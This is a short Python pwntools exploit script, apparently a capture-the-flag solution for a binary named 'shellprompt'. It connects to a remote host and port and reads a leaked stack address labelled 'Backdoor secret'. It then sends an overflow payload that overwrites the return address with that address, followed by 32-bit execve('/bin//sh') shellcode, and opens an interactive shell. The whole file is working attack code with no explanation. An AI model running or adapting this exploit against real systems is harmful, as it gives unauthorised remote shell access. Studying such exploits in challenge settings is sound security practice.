#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("shellprompt")
libc = elf.libc

local = False 
if local:
    p = process("./shellprompt")
    gdb.attach(p,'''b*shell+87\nc''')
else:
    p=remote("20.169.252.240" ,4822)

elf = context.binary = ELF('./shellprompt', checksec=False)

p.recvuntil(b"Backdoor secret: 0x")
leak = int(p.recv(8),16)+ 0x90
print(hex(leak)) 
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
p.sendline(p32(leak)*35 + p32(leak) + shellcode)
p.interactive()